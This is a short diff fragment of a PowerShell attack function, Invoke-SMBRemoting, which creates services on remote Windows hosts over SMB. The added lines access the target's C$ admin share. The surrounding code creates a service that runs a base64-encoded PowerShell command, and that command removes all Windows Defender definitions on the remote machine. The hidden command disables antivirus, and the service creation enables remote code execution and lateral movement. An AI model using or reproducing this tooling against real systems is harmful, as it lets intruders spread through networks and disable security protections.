@@ -78,6 +78,9 @@ function Invoke-SMBRemoting {
 	elseif(!$ServiceName -AND $ModifyService){
 		$ServiceName = "SensorService"
 	}
+
+ 	$trigtgs = '\\' + $ComputerName + '\c$'
+   	ls $trigtgs | Out-Null
 	
 	if($Purge){
 		$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc JgAgACcAQwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwBcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAXABNAHAAQwBtAGQAUgB1AG4ALgBlAHgAZQAnACAALQBSAGUAbQBvAHYAZQBEAGUAZgBpAG4AaQB0AGkAbwBuAHMAIAAtAEEAbABsAA==`""
